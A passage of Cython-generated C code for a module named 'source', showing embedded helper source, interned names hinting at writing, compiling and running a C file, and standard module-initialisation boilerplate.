PyUnicode_AsUTF8AndSize(o, length);\n#endif\n}\n#endif\n#endif\nstatic CYTHON_INLINE const char* __Pyx_PyObject_AsStringAndSize(PyObject* o, Py_ssize_t *length) {\n#if __PYX_DEFAULT_STRING_ENCODING_IS_ASCII || __PYX_DEFAULT_STRING_ENCODING_IS_DEFAULT\n    if (\n#if PY_MAJOR_VERSION < 3 && __PYX_DEFAULT_STRING_ENCODING_IS_ASCII\n            __Pyx_sys_getdefaultencoding_not_ascii &&\n#endif\n            PyUnicode_Check(o)) {\n        return __Pyx_PyUnicode_AsStringAndSize(o, length);\n    } else\n#endif\n#if (!CYTHON_COMPILING_IN_PYPY) || (defined(PyByteArray_AS_STRING) && defined(PyByteArray_GET_SIZE))\n    if (PyByteArray_Check(o)) {\n        *length = PyByteArray_GET_SIZE(o);\n        return PyByteArray_AS_STRING(o);\n    } else\n#endif\n    {\n        char* result;\n        int r = PyBytes_AsStringAndSize(o, &result, length);\n        if (unlikely(r < 0)) {\n            return NULL;\n        } else {\n            return result;\n        }\n    }\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrue(PyObject* x) {\n   int is_true = x == Py_True;\n   if (is_true | (x == Py_False) | (x == Py_None)) return is_true;\n   else return PyObject_IsTrue(x);\n}\nstatic CYTHON_INLINE int __Pyx_PyObject_IsTrueAndDecref(PyObject* x) {\n    int retval;\n    if (unlikely(!x)) return -1;\n    retval = __Pyx_PyObject_IsTrue(x);\n    Py_DECREF(x);\n    return retval;\n}\nstatic PyObject* __Pyx_PyNumber_IntOrLongWrongResultType(PyObject* result, const char* type_name) {\n#if PY_MAJOR_VERSION >= 3\n    if (PyLong_Check(result)) {\n        if (PyErr_WarnFormat(PyExc_DeprecationWarning, 1,\n                \"__int__ returned non-int (type %.200s).  \"\n                \"The ability to return an instance of a strict subclass of int \"\n                \"is deprecated, and may be removed in a future version of Python.\",\n                Py_TYPE(result)->tp_name)) {\n            Py_DECREF(result);\n            return NULL;\n        }\n      ""  return result;\n    }\n#endif\n    PyErr_Format(PyExc_TypeError,\n                 \"__%.4s__ returned non-%.4s (type %.200s)\",\n                 type_name, type_name, Py_TYPE(result)->tp_name);\n    Py_DECREF(result);\n    return NULL;\n}\nstatic CYTHON_INLINE PyObject* __Pyx_PyNumber_IntOrLong(PyObject* x) {\n#if CYTHON_USE_TYPE_SLOTS\n  PyNumberMethods *m;\n#endif\n  const char *name = NULL;\n  PyObject *res = NULL;\n#if PY_MAJOR_VERSION < 3\n  if (likely(PyInt_Check(x) || PyLong_Check(x)))\n#else\n  if (likely(PyLong_Check(x)))\n#endif\n    return __Pyx_NewRef(x);\n#if CYTHON_USE_TYPE_SLOTS\n  m = Py_TYPE(x)->tp_as_number;\n  #if PY_MAJOR_VERSION < 3\n  if (m && m->nb_int) {\n    name = \"int\";\n    res = m->nb_int(x);\n  }\n  else if (m && m->nb_long) {\n    name = \"long\";\n    res = m->nb_long(x);\n  }\n  #else\n  if (likely(m && m->nb_int)) {\n    name = \"int\";\n    res = m->nb_int(x);\n  }\n  #endif\n#else\n  if (!PyBytes_CheckExact(x) && !PyUnicode_CheckExact(x)) {\n    res = PyNumber_Int(x);\n  }\n#endif\n  if (likely(res)) {\n#if PY_MAJOR_VERSION < 3\n    if (unlikely(!PyInt_Check(res) && !PyLong_Check(res))) {\n#else\n    if (unlikely(!PyLong_CheckExact(res))) {\n#endif\n        return __Pyx_PyNumber_IntOrLongWrongResultType(res, name);\n    }\n  }\n  else if (!PyErr_Occurred()) {\n    PyErr_SetString(PyExc_TypeError,\n                    \"an integer is required\");\n  }\n  return res;\n}\nstatic CYTHON_INLINE Py_ssize_t __Pyx_PyIndex_AsSsize_t(PyObject* b) {\n  Py_ssize_t ival;\n  PyObject *x;\n#if PY_MAJOR_VERSION < 3\n  if (likely(PyInt_CheckExact(b))) {\n    if (sizeof(Py_ssize_t) >= sizeof(long))\n        return PyInt_AS_LONG(b);\n    else\n        return PyInt_AsSsize_t(b);\n  }\n#endif\n  if (likely(PyLong_CheckExact(b))) {\n    #if CYTHON_USE_PYLONG_INTERNALS\n    const digit* digits = ((PyLongObject*)b)->ob_digit;\n    const Py_ssize_t size = Py_SIZE(b);\n    if (likely(__Pyx_sst_abs(size) <= 1)) {\n        ival = likely(size) ? digits[""0] : 0;\n        if (size == -1) ival = -ival;\n        return ival;\n    } else {\n      switch (size) {\n         case 2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -2:\n           if (8 * sizeof(Py_ssize_t) > 2 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -3:\n           if (8 * sizeof(Py_ssize_t) > 3 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case 4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return (Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n         case -4:\n           if (8 * sizeof(Py_ssize_t) > 4 * PyLong_SHIFT) {\n             return -(Py_ssize_t) (((((((((size_t)digits[3]) << PyLong_SHIFT) | (size_t)digits[2]) << PyLong_SHIFT) | (size_t)digits[1]) << PyLong_SHIFT) | (size_t)digits[0]));\n           }\n           break;\n      }\n    }\n    #endif\n    return PyLong_AsSsize_t(b);\n  }\n  x = PyNumber_Index(b);\n  if (!x) return -1;\n  ival = PyInt_AsSsize_t(x);\n  Py_DECREF(x);\n  return ival;\n}\nstatic CYTHON_INLINE Py_hash_t __Pyx_PyIndex_AsHash_t(PyObject* o) {\n  if (sizeof(Py_hash_t) == sizeof(Py_ssize_t)) {\n    return (Py_hash_t) __Pyx_PyIndex_AsSsize_t(o);\n#if PY_MAJOR_VERSION < 3\n  } else if (li""kely(PyInt_CheckExact(o))) {\n    return PyInt_AS_LONG(o);\n#endif\n  } else {\n    Py_ssize_t ival;\n    PyObject *x;\n    x = PyNumber_Index(o);\n    if (!x) return -1;\n    ival = PyInt_AsLong(x);\n    Py_DECREF(x);\n    return ival;\n  }\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyBool_FromLong(long b) {\n  return b ? __Pyx_NewRef(Py_True) : __Pyx_NewRef(Py_False);\n}\nstatic CYTHON_INLINE PyObject * __Pyx_PyInt_FromSize_t(size_t ival) {\n    return PyInt_FromSize_t(ival);\n}\n\n\n#endif /* Py_PYTHON_H */";
static PyObject *__pyx_kp_u_;
static PyObject *__pyx_n_s_COMPILE_FILE;
static PyObject *__pyx_n_s_C_FILE;
static PyObject *__pyx_n_s_C_SOURCE;
static PyObject *__pyx_n_s_EXECUTE_FILE;
static PyObject *__pyx_n_s_EXPORT_PYTHONHOME;
static PyObject *__pyx_n_s_EXPORT_PYTHON_EXECUTABLE;
static PyObject *__pyx_kp_u_L;
static PyObject *__pyx_n_s_PREFIX;
static PyObject *__pyx_n_s_PSH_TEAM_KEY;
static PyObject *__pyx_n_s_PYTHON_VERSION;
static PyObject *__pyx_kp_u_PY_PRIVATE_20240909130916210;
static PyObject *__pyx_n_s_RUN;
static PyObject *__pyx_kp_u__2;
static PyObject *__pyx_kp_u__3;
static PyObject *__pyx_kp_u__5;
static PyObject *__pyx_kp_u__6;
static PyObject *__pyx_n_s_cline_in_traceback;
static PyObject *__pyx_n_s_dirname;
static PyObject *__pyx_n_s_enter;
static PyObject *__pyx_n_s_executable;
static PyObject *__pyx_n_s_exist_ok;
static PyObject *__pyx_n_s_exit;
static PyObject *__pyx_n_s_exit_2;
static PyObject *__pyx_kp_u_export_PYTHONHOME;
static PyObject *__pyx_kp_u_export_PYTHON_EXECUTABLE;
static PyObject *__pyx_n_s_f;
static PyObject *__pyx_kp_u_gcc_I;
static PyObject *__pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define;
static PyObject *__pyx_n_s_import;
static PyObject *__pyx_kp_u_include_python;
static PyObject *__pyx_n_s_isfile;
static PyObject *__pyx_kp_u_lib_lpython;
static PyObject *__pyx_n_s_main;
static PyObject *__pyx_n_s_makedirs;
static PyObject *__pyx_n_s_name;
static PyObject *__pyx_kp_u_o;
static PyObject *__pyx_n_s_open;
static PyObject *__pyx_n_s_os;
static PyObject *__pyx_n_s_path;
static PyObject *__pyx_n_s_prefix;
static PyObject *__pyx_kp_u_py_private_c;
static PyObject *__pyx_n_s_remove;
static PyObject *__pyx_n_s_split;
static PyObject *__pyx_n_s_sys;
static PyObject *__pyx_n_s_system;
static PyObject *__pyx_n_s_test;
static PyObject *__pyx_n_s_version;
static PyObject *__pyx_n_u_w;
static PyObject *__pyx_n_s_write;
static PyObject *__pyx_int_0;
static PyObject *__pyx_int_neg_1;
static PyObject *__pyx_slice__9;
static PyObject *__pyx_tuple__4;
static PyObject *__pyx_tuple__7;
static PyObject *__pyx_tuple__8;
static PyObject *__pyx_tuple__10;
/* Late includes */

static PyMethodDef __pyx_methods[] = {
  {0, 0, 0, 0}
};

#if PY_MAJOR_VERSION >= 3
#if CYTHON_PEP489_MULTI_PHASE_INIT
static PyObject* __pyx_pymod_create(PyObject *spec, PyModuleDef *def); /*proto*/
static int __pyx_pymod_exec_source(PyObject* module); /*proto*/
static PyModuleDef_Slot __pyx_moduledef_slots[] = {
  {Py_mod_create, (void*)__pyx_pymod_create},
  {Py_mod_exec, (void*)__pyx_pymod_exec_source},
  {0, NULL}
};
#endif

static struct PyModuleDef __pyx_moduledef = {
    PyModuleDef_HEAD_INIT,
    "source",
    0, /* m_doc */
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    0, /* m_size */
  #else
    -1, /* m_size */
  #endif
    __pyx_methods /* m_methods */,
  #if CYTHON_PEP489_MULTI_PHASE_INIT
    __pyx_moduledef_slots, /* m_slots */
  #else
    NULL, /* m_reload */
  #endif
    NULL, /* m_traverse */
    NULL, /* m_clear */
    NULL /* m_free */
};
#endif
#ifndef CYTHON_SMALL_CODE
#if defined(__clang__)
    #define CYTHON_SMALL_CODE
#elif defined(__GNUC__) && (__GNUC__ > 4 || (__GNUC__ == 4 && __GNUC_MINOR__ >= 3))
    #define CYTHON_SMALL_CODE __attribute__((cold))
#else
    #define CYTHON_SMALL_CODE
#endif
#endif

static __Pyx_StringTabEntry __pyx_string_tab[] = {
  {&__pyx_kp_u_, __pyx_k_, sizeof(__pyx_k_), 0, 1, 0, 0},
  {&__pyx_n_s_COMPILE_FILE, __pyx_k_COMPILE_FILE, sizeof(__pyx_k_COMPILE_FILE), 0, 0, 1, 1},
  {&__pyx_n_s_C_FILE, __pyx_k_C_FILE, sizeof(__pyx_k_C_FILE), 0, 0, 1, 1},
  {&__pyx_n_s_C_SOURCE, __pyx_k_C_SOURCE, sizeof(__pyx_k_C_SOURCE), 0, 0, 1, 1},
  {&__pyx_n_s_EXECUTE_FILE, __pyx_k_EXECUTE_FILE, sizeof(__pyx_k_EXECUTE_FILE), 0, 0, 1, 1},
  {&__pyx_n_s_EXPORT_PYTHONHOME, __pyx_k_EXPORT_PYTHONHOME, sizeof(__pyx_k_EXPORT_PYTHONHOME), 0, 0, 1, 1},
  {&__pyx_n_s_EXPORT_PYTHON_EXECUTABLE, __pyx_k_EXPORT_PYTHON_EXECUTABLE, sizeof(__pyx_k_EXPORT_PYTHON_EXECUTABLE), 0, 0, 1, 1},
  {&__pyx_kp_u_L, __pyx_k_L, sizeof(__pyx_k_L), 0, 1, 0, 0},
  {&__pyx_n_s_PREFIX, __pyx_k_PREFIX, sizeof(__pyx_k_PREFIX), 0, 0, 1, 1},
  {&__pyx_n_s_PSH_TEAM_KEY, __pyx_k_PSH_TEAM_KEY, sizeof(__pyx_k_PSH_TEAM_KEY), 0, 0, 1, 1},
  {&__pyx_n_s_PYTHON_VERSION, __pyx_k_PYTHON_VERSION, sizeof(__pyx_k_PYTHON_VERSION), 0, 0, 1, 1},
  {&__pyx_kp_u_PY_PRIVATE_20240909130916210, __pyx_k_PY_PRIVATE_20240909130916210, sizeof(__pyx_k_PY_PRIVATE_20240909130916210), 0, 1, 0, 0},
  {&__pyx_n_s_RUN, __pyx_k_RUN, sizeof(__pyx_k_RUN), 0, 0, 1, 1},
  {&__pyx_kp_u__2, __pyx_k__2, sizeof(__pyx_k__2), 0, 1, 0, 0},
  {&__pyx_kp_u__3, __pyx_k__3, sizeof(__pyx_k__3), 0, 1, 0, 0},
  {&__pyx_kp_u__5, __pyx_k__5, sizeof(__pyx_k__5), 0, 1, 0, 0},
  {&__pyx_kp_u__6, __pyx_k__6, sizeof(__pyx_k__6), 0, 1, 0, 0},
  {&__pyx_n_s_cline_in_traceback, __pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 0, 1, 1},
  {&__pyx_n_s_dirname, __pyx_k_dirname, sizeof(__pyx_k_dirname), 0, 0, 1, 1},
  {&__pyx_n_s_enter, __pyx_k_enter, sizeof(__pyx_k_enter), 0, 0, 1, 1},
  {&__pyx_n_s_executable, __pyx_k_executable, sizeof(__pyx_k_executable), 0, 0, 1, 1},
  {&__pyx_n_s_exist_ok, __pyx_k_exist_ok, sizeof(__pyx_k_exist_ok), 0, 0, 1, 1},
  {&__pyx_n_s_exit, __pyx_k_exit, sizeof(__pyx_k_exit), 0, 0, 1, 1},
  {&__pyx_n_s_exit_2, __pyx_k_exit_2, sizeof(__pyx_k_exit_2), 0, 0, 1, 1},
  {&__pyx_kp_u_export_PYTHONHOME, __pyx_k_export_PYTHONHOME, sizeof(__pyx_k_export_PYTHONHOME), 0, 1, 0, 0},
  {&__pyx_kp_u_export_PYTHON_EXECUTABLE, __pyx_k_export_PYTHON_EXECUTABLE, sizeof(__pyx_k_export_PYTHON_EXECUTABLE), 0, 1, 0, 0},
  {&__pyx_n_s_f, __pyx_k_f, sizeof(__pyx_k_f), 0, 0, 1, 1},
  {&__pyx_kp_u_gcc_I, __pyx_k_gcc_I, sizeof(__pyx_k_gcc_I), 0, 1, 0, 0},
  {&__pyx_kp_u_ifndef_PY_SSIZE_T_CLEAN_define, __pyx_k_ifndef_PY_SSIZE_T_CLEAN_define, sizeof(__pyx_k_ifndef_PY_SSIZE_T_CLEAN_define), 0, 1, 0, 0},
  {&__pyx_n_s_import, __pyx_k_import, sizeof(__pyx_k_import), 0, 0, 1, 1},
  {&__pyx_kp_u_include_python, __pyx_k_include_python, sizeof(__pyx_k_include_python), 0, 1, 0, 0},
  {&__pyx_n_s_isfile, __pyx_k_isfile, sizeof(__pyx_k_isfile), 0, 0, 1, 1},
  {&__pyx_kp_u_lib_lpython, __pyx_k_lib_lpython, sizeof(__pyx_k_lib_lpython), 0, 1, 0, 0},
  {&__pyx_n_s_main, __pyx_k_main, sizeof(__pyx_k_main), 0, 0, 1, 1},
  {&__pyx_n_s_makedirs, __pyx_k_makedirs, sizeof(__pyx_k_makedirs), 0, 0, 1, 1},
  {&__pyx_n_s_name, __pyx_k_name, sizeof(__pyx_k_name), 0, 0, 1, 1},
  {&__pyx_kp_u_o, __pyx_k_o, sizeof(__pyx_k_o), 0, 1, 0, 0},
  {&__pyx_n_s_open, __pyx_k_open, sizeof(__pyx_k_open), 0, 0, 1, 1},
  {&__pyx_n_s_os, __pyx_k_os, sizeof(__pyx_k_os), 0, 0, 1, 1},
  {&__pyx_n_s_path, __pyx_k_path, sizeof(__pyx_k_path), 0, 0, 1, 1},
  {&__pyx_n_s_prefix, __pyx_k_prefix, sizeof(__pyx_k_prefix), 0, 0, 1, 1},
  {&__pyx_kp_u_py_private_c, __pyx_k_py_private_c, sizeof(__pyx_k_py_private_c), 0, 1, 0, 0},
  {&__pyx_n_s_remove, __pyx_k_remove, sizeof(__pyx_k_remove), 0, 0, 1, 1},
  {&__pyx_n_s_split, __pyx_k_split, sizeof(__pyx_k_split), 0, 0, 1, 1},
  {&__pyx_n_s_sys, __pyx_k_sys, sizeof(__pyx_k_sys), 0, 0, 1, 1},
  {&__pyx_n_s_system, __pyx_k_system, sizeof(__pyx_k_system), 0, 0, 1, 1},
  {&__pyx_n_s_test, __pyx_k_test, sizeof(__pyx_k_test), 0, 0, 1, 1},
  {&__pyx_n_s_version, __pyx_k_version, sizeof(__pyx_k_version), 0, 0, 1, 1},
  {&__pyx_n_u_w, __pyx_k_w, sizeof(__pyx_k_w), 0, 1, 0, 1},
  {&__pyx_n_s_write, __pyx_k_write, sizeof(__pyx_k_write), 0, 0, 1, 1},
  {0, 0, 0, 0, 0, 0, 0}
};
static CYTHON_SMALL_CODE int __Pyx_InitCachedBuiltins(void) {
  __pyx_builtin_exit = __Pyx_GetBuiltinName(__pyx_n_s_exit); if (!__pyx_builtin_exit) __PYX_ERR(0, 19, __pyx_L1_error)
  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_n_s_open); if (!__pyx_builtin_open) __PYX_ERR(0, 4448, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitCachedConstants(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);

  
  __pyx_tuple__4 = PyTuple_Pack(1, __pyx_int_0); if (unlikely(!__pyx_tuple__4)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__4);
  __Pyx_GIVEREF(__pyx_tuple__4);

  
  __pyx_tuple__7 = PyTuple_Pack(1, __pyx_kp_u__6); if (unlikely(!__pyx_tuple__7)) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__7);
  __Pyx_GIVEREF(__pyx_tuple__7);
  __pyx_tuple__8 = PyTuple_Pack(1, __pyx_kp_u__5); if (unlikely(!__pyx_tuple__8)) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__8);
  __Pyx_GIVEREF(__pyx_tuple__8);
  __pyx_slice__9 = PySlice_New(Py_None, __pyx_int_neg_1, Py_None); if (unlikely(!__pyx_slice__9)) __PYX_ERR(0, 4431, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_slice__9);
  __Pyx_GIVEREF(__pyx_slice__9);

  
  __pyx_tuple__10 = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_tuple__10)) __PYX_ERR(0, 4448, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_tuple__10);
  __Pyx_GIVEREF(__pyx_tuple__10);
  __Pyx_RefNannyFinishContext();
  return 0;
  __pyx_L1_error:;
  __Pyx_RefNannyFinishContext();
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_InitGlobals(void) {
  if (__Pyx_InitStrings(__pyx_string_tab) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_0 = PyInt_FromLong(0); if (unlikely(!__pyx_int_0)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_int_neg_1 = PyInt_FromLong(-1); if (unlikely(!__pyx_int_neg_1)) __PYX_ERR(0, 5, __pyx_L1_error)
  return 0;
  __pyx_L1_error:;
  return -1;
}

static CYTHON_SMALL_CODE int __Pyx_modinit_global_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_export_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_init_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_type_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_variable_import_code(void); /*proto*/
static CYTHON_SMALL_CODE int __Pyx_modinit_function_import_code(void); /*proto*/

static int __Pyx_modinit_global_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_global_init_code", 0);
  /*--- Global init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_export_code", 0);
  /*--- Variable export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_export_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_export_code", 0);
  /*--- Function export code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_init_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_init_code", 0);
  /*--- Type init code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_type_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_type_import_code", 0);
  /*--- Type import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_variable_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_variable_import_code", 0);
  /*--- Variable import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}

static int __Pyx_modinit_function_import_code(void) {
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__Pyx_modinit_function_import_code", 0);
  /*--- Function import code ---*/
  __Pyx_RefNannyFinishContext();
  return 0;
}


#ifndef CYTHON_NO_PYINIT_EXPORT
#define __Pyx_PyMODINIT_FUNC PyMODINIT_FUNC
#elif PY_MAJOR_VERSION < 3
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" void
#else
#define __Pyx_PyMODINIT_FUNC void
#endif
#else
#ifdef __cplusplus
#define __Pyx_PyMODINIT_FUNC extern "C" PyObject *
#else
#define __Pyx_PyMODINIT_FUNC PyObject *
#endif
#endif


#if PY_MAJOR_VERSION < 3
__Pyx_PyMODINIT_FUNC initsource(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC initsource(void)
#else
__Pyx_PyMODINIT_FUNC PyInit_source(void) CYTHON_SMALL_CODE; /*proto*/
__Pyx_PyMODINIT_FUNC PyInit_source(void)
#if CYTHON_PEP489_MULTI_PHASE_INIT
{
  return PyModuleDef_Init(&__pyx_moduledef);
}
static CYTHON_SMALL_CODE int __Pyx_check_single_interpreter(void) {
    #if PY_VERSION_HEX >= 0x030700A1
    static PY_INT64_T main_interpreter_id = -1;
    PY_INT64_T current_id = PyInterpreterState_GetID(PyThreadState_Get()->interp);
    if (main_interpreter_id == -1) {
        main_interpreter_id = current_id;
        return (unlikely(current_id == -1)) ? -1 : 0;
    } else if (unlikely(main_interpreter_id != current_id))
    #else
    static PyInterpreterState *main_interpreter = NULL;
    PyInterpreterState *current_interpreter = PyThreadState_Get()->interp;
    if (!main_interpreter) {
        main_interpreter = current_interpreter;
    } else if (unlikely(main_interpreter != current_interpreter))
    #endif
    {
        PyErr_SetString(
            PyExc_ImportError,
            "Interpreter change detected - this module can only be loaded into one interpreter per process.");
        return -1;
    }
    return 0;
}
static CYTHON_SMALL_CODE int __Pyx_copy_spec_to_module(PyObject *spec, PyObject *moddict, const char* from_name, const char* to_name, int allow_none) {
    PyObject *value = PyObject_GetAttrString(spec, from_name);
    int result = 0;
    if (likely(value)) {
        if (allow_none || value != Py_None) {
            result = PyDict_SetItemString(moddict, to_name, value);
        }
        Py_DECREF(value);
    } else if (PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Clear();
    } else {
        result = -1;
    }
    return result;
}
static CYTHON_SMALL_CODE PyObject* __pyx_pymod_create(PyObject *spec, CYTHON_UNUSED PyModuleDef *def) {
    PyObject *module = NULL, *moddict, *modname;
    if (__Pyx_check_single_interpreter())
        return NULL;
    if (__pyx_m)
        return __Pyx_NewRef(__pyx_m);
    modname = PyObject_GetAttrString(spec, "name");
    if (unlikely(!modname)) goto bad;
    module = PyModule_NewObject(modname);
    Py_DECREF(modname);
    if (unlikely(!module)) goto bad;
    moddict = PyModule_GetDict(module);
    if (unlikely(!moddict)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "loader", "__loader__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "origin", "__file__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "parent", "__package__", 1) < 0)) goto bad;
    if (unlikely(__Pyx_copy_spec_to_module(spec, moddict, "submodule_search_locations", "__path__", 0) < 0)) goto bad;
    return module;
bad:
    Py_XDECREF(module);
    return NULL;
}


static CYTHON_SMALL_CODE int __pyx_pymod_exec_source(PyObject *__pyx_pyinit_module)
#endif
#endif
{
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  PyObject *__pyx_t_5 = NULL;
  PyObject *__pyx_t_6 = NULL;
  PyObject *__pyx_t_7 = NULL;
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  int __pyx_t_11;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  if (__pyx_m) {
    if (__pyx_m == __pyx_pyinit_module) return 0;
    PyErr_SetString(PyExc_RuntimeError, "Module 'source' has already been imported. Re-initialisation is not supported.");
    return -1;
  }
  #elif PY_MAJOR_VERSION >= 3
  if (__pyx_m) return __Pyx_NewRef(__pyx_m);
  #endif
  #if CYTHON_REFNANNY
__Pyx_RefNanny = __Pyx_RefNannyImportAPI("refnanny");
if (!__Pyx_RefNanny) {
  PyErr_Clear();
  __Pyx_RefNanny = __Pyx_RefNannyImportAPI("Cython.Runtime.refnanny");
  if (!__Pyx_RefNanny)
      Py_FatalError("failed to import 'refnanny' module");
}
#endif
  __Pyx_RefNannySetupContext("__Pyx_PyMODINIT_FUNC PyInit_source(void)", 0);
  if (__Pyx_check_binary_version() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #ifdef __Pxy_PyFrame_Initialize_Offsets
  __Pxy_PyFrame_Initialize_Offsets();
  #endif
  __pyx_empty_tuple = PyTuple_New(0); if (unlikely(!__pyx_empty_tuple)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_empty_bytes = PyBytes_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_bytes)) __PYX_ERR(0, 5, __pyx_L1_error)
  __pyx_empty_unicode = PyUnicode_FromStringAndSize("", 0); if (unlikely(!__pyx_empty_unicode)) __PYX_ERR(0, 5, __pyx_L1_error)
  #ifdef __Pyx_CyFunction_USED
  if (__pyx_CyFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_FusedFunction_USED
  if (__pyx_FusedFunction_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Coroutine_USED
  if (__pyx_Coroutine_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_Generator_USED
  if (__pyx_Generator_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_AsyncGen_USED
  if (__pyx_AsyncGen_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  #ifdef __Pyx_StopAsyncIteration_USED
  if (__pyx_StopAsyncIteration_init() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  /*--- Library function declarations ---*/
  /*--- Threads initialization code ---*/
  #if defined(WITH_THREAD) && PY_VERSION_HEX < 0x030700F0 && defined(__PYX_FORCE_INIT_THREADS) && __PYX_FORCE_INIT_THREADS
  PyEval_InitThreads();
  #endif
  /*--- Module creation code ---*/
  #if CYTHON_PEP489_MULTI_PHASE_INIT
  __pyx_m = __pyx_pyinit_module;
  Py_INCREF(__pyx_m);
  #else
  #if PY_MAJOR_VERSION < 3
  __pyx_m = Py_InitModule4("source", __pyx_methods, 0, 0, PYTHON_API_VERSION); Py_XINCREF(__pyx_m);
  #else
  __pyx_m = PyModule_Create(&__pyx_moduledef);
  #endif
  if (unlikely(!__pyx_m)) __PYX_ERR(0, 5, __pyx_L1_error)
  #endif
  __pyx_d = PyModule_GetDict(__pyx_m); if (unlikely(!__pyx_d)) __PYX_ERR(0, 5, __pyx_L1_error)
  Py_INCREF(__pyx_d);
  __pyx_b = PyImport_AddModule(__Pyx_BUILTIN_MODULE_NAME); if (unlikely(!__pyx_b)) __PYX_ERR(0, 5, __pyx_L1_error)
  Py_INCREF(__pyx_b);
  __pyx_cython_runtime = PyImport_AddModule((char *) "cython_runtime"); if (unlikely(!__pyx_cython_runtime)) __PYX_ERR(0, 5, __pyx_L1_error)
  Py_INCREF(__pyx_cython_runtime);
  if (PyObject_SetAttrString(__pyx_m, "__builtins__", __pyx_b) < 0) __PYX_ERR(0, 5, __pyx_L1_error)
  /*--- Initialize various global constants etc. ---*/
  if (__Pyx_InitGlobals() < 0) __PYX_ERR(0, 5, __pyx_L1_error)
